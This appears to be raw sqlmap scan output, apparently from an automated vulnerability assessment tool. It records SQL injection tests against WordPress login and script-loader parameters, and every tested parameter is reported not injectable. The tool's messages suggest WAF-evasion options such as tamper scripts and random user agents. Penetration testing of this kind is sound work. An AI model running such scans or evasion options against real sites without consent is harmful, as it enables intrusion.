+[[36m19:32:09[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mtestcookie[0m[1m' might not be injectable[0m
+[[36m19:32:09[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mtestcookie[0m'
+[[36m19:32:09[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:09[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:09[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:09[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:09[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:10[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:11[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:11[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37mtestcookie[0m[1m' does not seem to be injectable[0m
+[[36m19:32:11[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. You can give it a go with the switch '[37m--text-only[0m' if the target page has a low percentage of textual content (~9.73% of page content is text). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:32:11 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:32:13 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:32:13[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:32:13[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('wordpress_test_cookie=WP+Cookie+check'). Do you want to use those [Y/n] Y
+[0m[[36m19:32:13[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:32:13[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:32:13[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37muser_login[0m[1m' might not be injectable[0m
+[[36m19:32:14[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37muser_login[0m'
+[[36m19:32:14[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:14[0m] [[33mWARNING[0m] reflective value(s) found and filtering out
+[[36m19:32:15[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:15[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:15[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:15[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:16[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:17[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:17[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:17[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:32:17[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:17[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37muser_login[0m[1m' does not seem to be injectable[0m
+[[36m19:32:18[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mredirect_to[0m[1m' might not be injectable[0m
+[[36m19:32:18[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mredirect_to[0m'
+[[36m19:32:18[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:18[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:18[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:18[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:19[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:20[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:20[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:20[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:20[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:21[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37mredirect_to[0m[1m' does not seem to be injectable[0m
+[[36m19:32:21[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that POST parameter '[37mwp-submit[0m[1m' might not be injectable[0m
+[[36m19:32:21[0m] [[32mINFO[0m] testing for SQL injection on POST parameter '[37mwp-submit[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:21[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:22[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:23[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:23[0m][1m [[33;1mWARNING[0m][1m POST parameter '[37mwp-submit[0m[1m' does not seem to be injectable[0m
+[[36m19:32:23[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37maction[0m[1m' might not be injectable[0m
+[[36m19:32:23[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37maction[0m'
+[[36m19:32:23[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:23[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:23[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:24[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:25[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:25[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:25[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:25[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:25[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:25[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37maction[0m[1m' does not seem to be injectable[0m
+[[36m19:32:25[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:32:25 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m,[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:32:27 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:32:27[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:32:27[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m19:32:29[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:32:31[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:32:33[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:32:34[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:32:36[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mc[0m[1m' might not be injectable[0m
+[[36m19:32:40[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mc[0m'
+[[36m19:32:40[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:43[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:44[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:44[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:44[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:45[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:45[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:46[0m] [[41;37mCRITICAL[0m] considerable lagging has been detected in connection response(s). Please use as high value for option '[37m--time-sec[0m' as possible (e.g. 10 or more)
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:46[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:47[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:32:47[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:48[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mc[0m[1m' does not seem to be injectable[0m
+[[36m19:32:48[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mdir[0m[1m' might not be injectable[0m
+[[36m19:32:49[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mdir[0m'
+[[36m19:32:49[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:50[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:32:51[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:32:52[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:32:52[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:32:52[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:32:52[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:32:53[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:32:53[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:32:53[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:32:53[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:32:53[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:32:54[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:32:54[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:32:54[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:32:55[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mdir[0m[1m' does not seem to be injectable[0m
+[[36m19:32:55[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mload[][0m[1m' might not be injectable[0m
+[[36m19:32:56[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mload[][0m'
+[[36m19:32:56[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:32:59[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:32:59[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:33:00[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:33:00[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:33:00[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:33:01[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:33:02[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:33:02[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:33:04[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mload[][0m[1m' does not seem to be injectable[0m
+[[36m19:33:04[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mver[0m[1m' might not be injectable[0m
+[[36m19:33:05[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mver[0m'
+[[36m19:33:05[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:33:07[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:33:07[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:33:08[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:33:08[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:33:08[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:33:09[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:33:09[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:33:09[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:33:09[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:33:09[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:33:10[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:33:10[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:33:10[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:33:10[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:33:11[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:33:12[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mver[0m[1m' does not seem to be injectable[0m
+[[36m19:33:12[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:33:12 /2020-04-13/
+
